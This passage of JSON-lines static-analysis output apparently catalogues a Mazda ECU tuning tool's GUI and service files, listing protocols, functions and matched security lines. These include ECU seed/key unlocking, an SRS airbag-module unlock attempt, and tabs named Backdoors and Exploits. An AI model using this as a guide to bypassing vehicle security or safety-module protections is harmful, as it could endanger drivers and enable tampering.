{"type": "hardware", "line": 164, "hardware": "ECU", "content": "self.output.appendPlainText(\"MZRECU tables: \" + \", \".join(tables))"}], "security_logic": [{"type": "security_pattern", "line": 17, "pattern": "key", "content": "\"\\n\".join(f\"{key}: {value}\" for key, value in self.coordinator.summary().items())"}, {"type": "security_pattern", "line": 38, "pattern": "seed", "content": "btn_seed = QtWidgets.QPushButton(\"Request seed\")"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "layout.addWidget(btn_seed)"}, {"type": "security_pattern", "line": 48, "pattern": "seed", "content": "btn_seed.clicked.connect(self.request_seed)"}, {"type": "security_pattern", "line": 52, "pattern": "seed", "content": "def request_seed(self) -> None:"}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "seed = self.coordinator.security.request_seed(CobbSecurityService.TUNING_LEVEL)"}, {"type": "security_pattern", "line": 54, "pattern": "seed", "content": "self.output.appendPlainText(f\"Seed: {seed:04X}\")"}, {"type": "security_pattern", "line": 63, "pattern": "key", "content": "for key, value in ident.items():"}, {"type": "security_pattern", "line": 64, "pattern": "key", "content": "self.output.appendPlainText(f\"{key}: {value}\")"}, {"type": "security_pattern", "line": 163, "pattern": "key", "content": "tables = sorted(ecu_model.CALIBRATION_TABLES.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/comms.py", "lines_read": 47, "features_found": [{"type": "function", "name": "__init__", "line": 8}, {"type": "function", "name": "setup_ui", "line": 13}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "QtWidgets,", "line": null}], "components_found": [{"type": "class", "name": "CommsTab", "line": 5}], "algorithms": [], "protocols": [{"type": "protocol", "line": 22, "protocol": "CAN", "content": "self.interface_combo.addItems([\"Simulation\", \"J2534\", \"CAN Bus\", \"OBD-II\"])"}, {"type": "protocol", "line": 22, "protocol": "OBD", "content": "self.interface_combo.addItems([\"Simulation\", \"J2534\", \"CAN Bus\", \"OBD-II\"])"}, {"type": "protocol", "line": 22, "protocol": "J2534", "content": "self.interface_combo.addItems([\"Simulation\", \"J2534\", \"CAN Bus\", \"OBD-II\"])"}, {"type": "protocol", "line": 35, "protocol": "OBD", "content": "self.protocol_combo.addItems([\"ISO-TP\", \"UDS\", \"KWP2000\", \"OBD-II\"])"}, {"type": "protocol", "line": 35, "protocol": "ISO-TP", "content": "self.protocol_combo.addItems([\"ISO-TP\", \"UDS\", \"KWP2000\", \"OBD-II\"])"}, {"type": "protocol", "line": 35, "protocol": "UDS", "content": "self.protocol_combo.addItems([\"ISO-TP\", \"UDS\", \"KWP2000\", \"OBD-II\"])"}, {"type": "protocol", "line": 35, "protocol": "KWP", "content": "self.protocol_combo.addItems([\"ISO-TP\", \"UDS\", \"KWP2000\", \"OBD-II\"])"}], "hardware_assumptions": [{"type": "hardware", "line": 22, "hardware": "CAN bus", "content": "self.interface_combo.addItems([\"Simulation\", \"J2534\", \"CAN Bus\", \"OBD-II\"])"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/dashboard.py", "lines_read": 9, "features_found": [{"type": "function", "name": "__init__", "line": 4}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}], "components_found": [{"type": "class", "name": "DashboardTab", "line": 3}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 7, "hardware": "vehicle", "content": "layout.addWidget(QtWidgets.QLabel(\"Vehicle: 2011 Mazdaspeed 3 \u2014 VIN 7AT0C13JX20200064\"))"}, {"type": "hardware", "line": 8, "hardware": "ABS", "content": "layout.addWidget(QtWidgets.QLabel(\"ABS/SRS modules ready (no interface connected)\"))"}, {"type": "hardware", "line": 8, "hardware": "SRS", "content": "layout.addWidget(QtWidgets.QLabel(\"ABS/SRS modules ready (no interface connected)\"))"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/diagnostic_library.py", "lines_read": 101, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "__init__", "line": 22}, {"type": "function", "name": "refresh", "line": 45}, {"type": "function", "name": "__init__", "line": 63}, {"type": "function", "name": "refresh", "line": 88}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.diagnostic_database", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtCore,", "line": null}, {"type": "import", "module": "DiagnosticDatabaseService", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticLibraryTab", "line": 8}, {"type": "class", "name": "PIDLibraryWidget", "line": 21}, {"type": "class", "name": "DTCLibraryWidget", "line": 62}], "algorithms": [], "protocols": [{"type": "protocol", "line": 13, "protocol": "PID", "content": "label = QtWidgets.QLabel(\"Mazdaspeed 3 diagnostic PID/DTC reference\")"}, {"type": "protocol", "line": 16, "protocol": "PID", "content": "tabs.addTab(PIDLibraryWidget(self.service), \"PIDs\")"}, {"type": "protocol", "line": 21, "protocol": "PID", "content": "class PIDLibraryWidget(QtWidgets.QWidget):"}, {"type": "protocol", "line": 28, "protocol": "PID", "content": "self.search.setPlaceholderText(\"Search PID or description\")"}, {"type": "protocol", "line": 39, "protocol": "PID", "content": "[\"PID\", \"Description\", \"Formula\", \"Units\", \"Bytes\", \"Mazda-specific\"]"}], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ABS", "content": "tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 16, "hardware": "ABS", "content": "tabs.addTab(PIDLibraryWidget(self.service), \"PIDs\")"}, {"type": "hardware", "line": 17, "hardware": "ABS", "content": "tabs.addTab(DTCLibraryWidget(self.service), \"DTCs\")"}, {"type": "hardware", "line": 18, "hardware": "ABS", "content": "layout.addWidget(tabs)"}], "security_logic": [{"type": "security_pattern", "line": 53, "pattern": "key", "content": "for col, key in enumerate("}, {"type": "security_pattern", "line": 56, "pattern": "key", "content": "item = QtWidgets.QTableWidgetItem(row[key])"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "src/muts/gui/tabs/diagnostics.py", "lines_read": 31, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "read_dtcs", "line": 19}, {"type": "function", "name": "clear_dtcs", "line": 28}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.diagnostics", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "DiagnosticsService", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticsTab", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "src/muts/gui/tabs/dyno.py", "lines_read": 19, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "pull", "line": 16}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.dyno", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "DynoService", "line": null}], "components_found": [{"type": "class", "name": "DynoTab", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/integration.py", "lines_read": 103, "features_found": [{"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "_setup_ui", "line": 26}, {"type": "function", "name": "refresh_summary", "line": 72}, {"type": "function", "name": "_simulate_ai_connect", "line": 87}, {"type": "function", "name": "_show_stack_section", "line": 92}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.integration_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "IntegrationCoordinator", "line": null}], "components_found": [{"type": "class", "name": "IntegrationTab", "line": 10}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 80, "pattern": "key", "content": "for key, v in value.items():"}, {"type": "security_pattern", "line": 81, "pattern": "key", "content": "lines.append(f\"  {key}: {v}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/mds.py", "lines_read": 141, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_build_summary", "line": 32}, {"type": "function", "name": "__init__", "line": 40}, {"type": "function", "name": "switch", "line": 55}, {"type": "function", "name": "__init__", "line": 63}, {"type": "function", "name": "calculate", "line": 73}, {"type": "function", "name": "__init__", "line": 80}, {"type": "function", "name": "run_test", "line": 94}, {"type": "function", "name": "__init__", "line": 105}, {"type": "function", "name": "adjust", "line": 116}, {"type": "function", "name": "__init__", "line": 124}, {"type": "function", "name": "compute", "line": 138}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.mds_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "(", "line": null}], "components_found": [{"type": "class", "name": "MDSTab", "line": 14}, {"type": "class", "name": "MDSProtocolWidget", "line": 39}, {"type": "class", "name": "MDSSecurityWidget", "line": 62}, {"type": "class", "name": "MDSDiagnosticsWidget", "line": 79}, {"type": "class", "name": "MDSCalibrationWidget", "line": 104}, {"type": "class", "name": "MDSChecksumWidget", "line": 123}], "algorithms": [{"type": "algorithm_function", "line": 73, "content": "def calculate(self) -> None:"}], "protocols": [{"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "seed = 0x1A2B3C4D"}], "hardware_assumptions": [{"type": "hardware", "line": 10, "hardware": "ECU", "content": "SecurityAccessLevel,"}, {"type": "hardware", "line": 24, "hardware": "ABS", "content": "sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 25, "hardware": "ABS", "content": "sub_tabs.addTab(MDSProtocolWidget(self.coordinator), \"Protocol\")"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "sub_tabs.addTab(MDSSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 26, "hardware": "ABS", "content": "sub_tabs.addTab(MDSSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 27, "hardware": "ABS", "content": "sub_tabs.addTab(MDSDiagnosticsWidget(self.coordinator), \"Diagnostics\")"}, {"type": "hardware", "line": 28, "hardware": "ABS", "content": "sub_tabs.addTab(MDSCalibrationWidget(self.coordinator), \"Calibration\")"}, {"type": "hardware", "line": 29, "hardware": "ABS", "content": "sub_tabs.addTab(MDSChecksumWidget(self.coordinator), \"Checksum\")"}, {"type": "hardware", "line": 30, "hardware": "ABS", "content": "layout.addWidget(sub_tabs)"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "class MDSSecurityWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "self.status = QtWidgets.QLabel(\"Security idle\")"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "key = self.coordinator.security_manager.solve(SecurityAccessLevel.LEVEL_3, seed)"}], "security_logic": [{"type": "security_pattern", "line": 68, "pattern": "key", "content": "btn = QtWidgets.QPushButton(\"Calculate level 3 key\")"}, {"type": "security_pattern", "line": 74, "pattern": "seed", "content": "seed = 0x1A2B3C4D"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "key = self.coordinator.security_manager.solve(SecurityAccessLevel.LEVEL_3, seed)"}, {"type": "security_pattern", "line": 75, "pattern": "seed", "content": "key = self.coordinator.security_manager.solve(SecurityAccessLevel.LEVEL_3, seed)"}, {"type": "security_pattern", "line": 76, "pattern": "key", "content": "self.status.setText(f\"Derived key: {hex(key)}\")"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "self.list_widget.addItems(list(self.coordinator.tests.TESTS.keys()))"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/mpsrom.py", "lines_read": 153, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "__init__", "line": 28}, {"type": "function", "name": "reload", "line": 43}, {"type": "function", "name": "show_details", "line": 49}, {"type": "function", "name": "__init__", "line": 66}, {"type": "function", "name": "calculate", "line": 83}, {"type": "function", "name": "patch", "line": 90}, {"type": "function", "name": "__init__", "line": 97}, {"type": "function", "name": "request_seed", "line": 111}, {"type": "function", "name": "unlock", "line": 115}, {"type": "function", "name": "__init__", "line": 122}, {"type": "function", "name": "refresh_entries", "line": 140}, {"type": "function", "name": "describe", "line": 145}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.mpsrom_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "MPSROMCoordinator", "line": null}], "components_found": [{"type": "class", "name": "MPSROMTab", "line": 8}, {"type": "class", "name": "MPSROMStructureWidget", "line": 27}, {"type": "class", "name": "MPSChecksumWidget", "line": 65}, {"type": "class", "name": "MPSecurityWidget", "line": 96}, {"type": "class", "name": "MPSMapWidget", "line": 121}], "algorithms": [{"type": "algorithm_function", "line": 58, "content": "f\"Checksum algorithm: {defn.checksum_algorithm or 'n/a'}\","}, {"type": "algorithm_function", "line": 83, "content": "def calculate(self) -> None:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 19, "hardware": "ABS", "content": "sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "sub_tabs.addTab(MPSROMStructureWidget(self.coordinator), \"ROM Structure\")"}, {"type": "hardware", "line": 21, "hardware": "ABS", "content": "sub_tabs.addTab(MPSChecksumWidget(self.coordinator), \"Checksums\")"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "sub_tabs.addTab(MPSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 22, "hardware": "ABS", "content": "sub_tabs.addTab(MPSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 23, "hardware": "ABS", "content": "sub_tabs.addTab(MPSMapWidget(self.coordinator), \"Maps\")"}, {"type": "hardware", "line": 24, "hardware": "ABS", "content": "layout.addWidget(sub_tabs)"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "class MPSecurityWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "seed = self.coordinator.security.request_seed()"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "success = self.coordinator.security.unlock_to(3)"}], "security_logic": [{"type": "security_pattern", "line": 58, "pattern": "algorithm", "content": "f\"Checksum algorithm: {defn.checksum_algorithm or 'n/a'}\","}, {"type": "security_pattern", "line": 103, "pattern": "seed", "content": "btn_seed = QtWidgets.QPushButton(\"Request seed\")"}, {"type": "security_pattern", "line": 105, "pattern": "seed", "content": "layout.addWidget(btn_seed)"}, {"type": "security_pattern", "line": 108, "pattern": "seed", "content": "btn_seed.clicked.connect(self.request_seed)"}, {"type": "security_pattern", "line": 111, "pattern": "seed", "content": "def request_seed(self) -> None:"}, {"type": "security_pattern", "line": 112, "pattern": "seed", "content": "seed = self.coordinator.security.request_seed()"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "self.output.appendPlainText(f\"Seed: 0x{seed:08X}\")"}, {"type": "security_pattern", "line": 149, "pattern": "key", "content": "lines = [f\"{key}: {value}\" for key, value in desc.items()]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/muts.py", "lines_read": 136, "features_found": [{"type": "function", "name": "__init__", "line": 11}, {"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "unlock", "line": 42}, {"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "attempt", "line": 64}, {"type": "function", "name": "__init__", "line": 70}, {"type": "function", "name": "apply_patch", "line": 81}, {"type": "function", "name": "__init__", "line": 89}, {"type": "function", "name": "engage", "line": 101}, {"type": "function", "name": "__init__", "line": 108}, {"type": "function", "name": "exploit", "line": 121}, {"type": "function", "name": "__init__", "line": 127}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.muts_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "MutsCoordinator", "line": null}], "components_found": [{"type": "class", "name": "MUTSTab", "line": 10}, {"type": "class", "name": "MUTSSecurityWidget", "line": 30}, {"type": "class", "name": "MUTSSRSWidget", "line": 49}, {"type": "class", "name": "MUTSEEPROMWidget", "line": 69}, {"type": "class", "name": "MUTSBackdoorWidget", "line": 88}, {"type": "class", "name": "MUTSExploitWidget", "line": 107}, {"type": "class", "name": "MUTSKnowledgeWidget", "line": 126}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ECU", "content": "layout.addWidget(QtWidgets.QLabel(\"MUTS deep stack (security, SRS, EEPROM, knowledge)\"))"}, {"type": "hardware", "line": 15, "hardware": "SRS", "content": "layout.addWidget(QtWidgets.QLabel(\"MUTS deep stack (security, SRS, EEPROM, knowledge)\"))"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "sub_tabs.addTab(MUTSSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 21, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 22, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSSRSWidget(self.coordinator), \"SRS\")"}, {"type": "hardware", "line": 22, "hardware": "SRS", "content": "sub_tabs.addTab(MUTSSRSWidget(self.coordinator), \"SRS\")"}, {"type": "hardware", "line": 23, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSEEPROMWidget(self.coordinator), \"EEPROM\")"}, {"type": "hardware", "line": 24, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSBackdoorWidget(self.coordinator), \"Backdoors\")"}, {"type": "hardware", "line": 25, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSExploitWidget(self.coordinator), \"Exploits\")"}, {"type": "hardware", "line": 26, "hardware": "ABS", "content": "sub_tabs.addTab(MUTSKnowledgeWidget(self.coordinator), \"Knowledge\")"}, {"type": "hardware", "line": 27, "hardware": "ABS", "content": "layout.addWidget(sub_tabs)"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "class MUTSSecurityWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "success = self.coordinator.security.unlock(5)"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "key = self.coordinator.security.calculate_key(5)"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "seed = self.coordinator.security.last_seed"}, {"type": "hardware", "line": 49, "hardware": "SRS", "content": "class MUTSSRSWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 65, "hardware": "SRS", "content": "granted = self.coordinator.srs.attempt_unlock(method)"}, {"type": "hardware", "line": 66, "hardware": "SRS", "content": "self.output.appendPlainText(f\"{method}: {'granted' if granted else 'denied'} ({self.coordinator.srs."}], "security_logic": [{"type": "security_pattern", "line": 44, "pattern": "key", "content": "key = self.coordinator.security.calculate_key(5)"}, {"type": "security_pattern", "line": 45, "pattern": "seed", "content": "seed = self.coordinator.security.last_seed"}, {"type": "security_pattern", "line": 46, "pattern": "key", "content": "self.output.appendPlainText(f\"Seed: 0x{seed:04X} Key: 0x{key:04X} Unlock: {'ok' if success else 'fai"}, {"type": "security_pattern", "line": 46, "pattern": "seed", "content": "self.output.appendPlainText(f\"Seed: 0x{seed:04X} Key: 0x{key:04X} Unlock: {'ok' if success else 'fai"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/repository_explorer.py", "lines_read": 88, "features_found": [{"type": "function", "name": "__init__", "line": 11}, {"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "preview_current", "line": 53}, {"type": "function", "name": "show_readme", "line": 66}, {"type": "function", "name": "show_diagram", "line": 71}, {"type": "function", "name": "_preview_file", "line": 76}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.repository_catalog", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "DirectoryCatalog,", "line": null}], "components_found": [{"type": "class", "name": "RepositoryExplorerTab", "line": 10}, {"type": "class", "name": "DirectoryWidget", "line": 24}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 16, "hardware": "ABS", "content": "self.sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "self.sub_tabs.addTab(DirectoryWidget(entry), entry.name.capitalize())"}, {"type": "hardware", "line": 21, "hardware": "ABS", "content": "layout.addWidget(self.sub_tabs)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/security.py", "lines_read": 24, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "apply", "line": 18}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.security", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "SecurityService", "line": null}], "components_found": [{"type": "class", "name": "SecurityTab", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "from ...services.security import SecurityService"}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "class SecurityTab(QtWidgets.QWidget):"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "self.service = SecurityService()"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "password", "content": "self.pin.setEchoMode(QtWidgets.QLineEdit.Password)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "src/muts/gui/tabs/tune_library.py", "lines_read": 69, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "__init__", "line": 21}, {"type": "function", "name": "_populate_table", "line": 38}, {"type": "function", "name": "show_details", "line": 51}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.tune_library", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "TuneLibraryService", "line": null}], "components_found": [{"type": "class", "name": "TuneLibraryTab", "line": 8}, {"type": "class", "name": "TuneCategoryWidget", "line": 20}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 40, "pattern": "key", "content": "for row, (key, tune) in enumerate(tunes.items()):"}, {"type": "security_pattern", "line": 42, "pattern": "key", "content": "key,"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "key = grade_item.text()"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "tune = self.service.get_metadata(self.category, key)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/tuning.py", "lines_read": 24, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "apply", "line": 17}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.torque_swas", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "TorqueSWASService", "line": null}], "components_found": [{"type": "class", "name": "TuningTab", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 11, "hardware": "ECU", "content": "self.btn_apply = QtWidgets.QPushButton(\"Queue ECU Actions\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "src/muts/gui/tabs/versa.py", "lines_read": 171, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "__init__", "line": 29}, {"type": "function", "name": "connect", "line": 48}, {"type": "function", "name": "disconnect", "line": 54}, {"type": "function", "name": "request", "line": 58}, {"type": "function", "name": "__init__", "line": 67}, {"type": "function", "name": "unlock", "line": 78}, {"type": "function", "name": "__init__", "line": 86}, {"type": "function", "name": "read_sector", "line": 105}, {"type": "function", "name": "checksum", "line": 110}, {"type": "function", "name": "__init__", "line": 117}, {"type": "function", "name": "adjust", "line": 131}, {"type": "function", "name": "__init__", "line": 144}, {"type": "function", "name": "scan_dtcs", "line": 158}, {"type": "function", "name": "clear_dtcs", "line": 166}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.versa_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "VersaCoordinator", "line": null}], "components_found": [{"type": "class", "name": "VersaTab", "line": 8}, {"type": "class", "name": "VersaCommWidget", "line": 28}, {"type": "class", "name": "VersaSecurityWidget", "line": 66}, {"type": "class", "name": "VersaROMWidget", "line": 85}, {"type": "class", "name": "VersaMapWidget", "line": 116}, {"type": "class", "name": "VersaDiagWidget", "line": 143}], "algorithms": [], "protocols": [{"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.coordinator.communicator.send_request(0x10, 0x02)"}], "hardware_assumptions": [{"type": "hardware", "line": 19, "hardware": "ABS", "content": "sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "sub_tabs.addTab(VersaCommWidget(self.coordinator), \"Communicator\")"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "sub_tabs.addTab(VersaSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 21, "hardware": "ABS", "content": "sub_tabs.addTab(VersaSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 22, "hardware": "ABS", "content": "sub_tabs.addTab(VersaROMWidget(self.coordinator), \"ROM\")"}, {"type": "hardware", "line": 23, "hardware": "ABS", "content": "sub_tabs.addTab(VersaMapWidget(self.coordinator), \"Maps\")"}, {"type": "hardware", "line": 24, "hardware": "ABS", "content": "sub_tabs.addTab(VersaDiagWidget(self.coordinator), \"Diagnostics\")"}, {"type": "hardware", "line": 25, "hardware": "ABS", "content": "layout.addWidget(sub_tabs)"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "class VersaSecurityWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "btn_unlock = QtWidgets.QPushButton(\"Unlock ECU\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "if self.coordinator.security.unlock():"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "self.output.appendPlainText(\"Versa security unlocked\")"}], "security_logic": [{"type": "security_pattern", "line": 91, "pattern": "key", "content": "self.map_selector.addItems(self.coordinator.rom.SECTORS.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/cobb_stack.py", "lines_read": 291, "features_found": [{"type": "function", "name": "__init__", "line": 39}, {"type": "function", "name": "_seed_key_algorithm", "line": 45}, {"type": "function", "name": "request_seed", "line": 53}, {"type": "function", "name": "send_key", "line": 58}, {"type": "function", "name": "unlock_ecu", "line": 65}, {"type": "function", "name": "read_memory", "line": 80}, {"type": "function", "name": "write_memory", "line": 85}, {"type": "function", "name": "read_identification", "line": 91}, {"type": "function", "name": "__init__", "line": 100}, {"type": "function", "name": "connect", "line": 108}, {"type": "function", "name": "disconnect", "line": 114}, {"type": "function", "name": "read_messages", "line": 118}, {"type": "function", "name": "write_messages", "line": 126}, {"type": "function", "name": "load_real_driver", "line": 135}, {"type": "function", "name": "__init__", "line": 146}, {"type": "function", "name": "list_tables", "line": 153}, {"type": "function", "name": "describe_table", "line": 156}, {"type": "function", "name": "__init__", "line": 161}, {"type": "function", "name": "press_button", "line": 165}, {"type": "function", "name": "toggle_power", "line": 169}, {"type": "function", "name": "__init__", "line": 175}, {"type": "function", "name": "open_port", "line": 179}, {"type": "function", "name": "close_port", "line": 183}, {"type": "function", "name": "status", "line": 186}, {"type": "function", "name": "__init__", "line": 191}, {"type": "function", "name": "read_dtcs", "line": 194}, {"type": "function", "name": "clear_dtcs", "line": 197}, {"type": "function", "name": "__init__", "line": 202}, {"type": "function", "name": "flash_calibration", "line": 205}, {"type": "function", "name": "__init__", "line": 233}, {"type": "function", "name": "sample", "line": 236}, {"type": "function", "name": "__init__", "line": 250}, {"type": "function", "name": "summary", "line": 269}, {"type": "function", "name": "start_virtual_ap", "line": 281}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "cobb2", "line": null}, {"type": "import", "module": "cobb3", "line": null}, {"type": "import", "module": "cobb5", "line": null}, {"type": "import", "module": "cobb6", "line": null}, {"type": "import", "module": ".queue", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "J2534Protocol", "line": null}, {"type": "import", "module": "MZRECU", "line": null}, {"type": 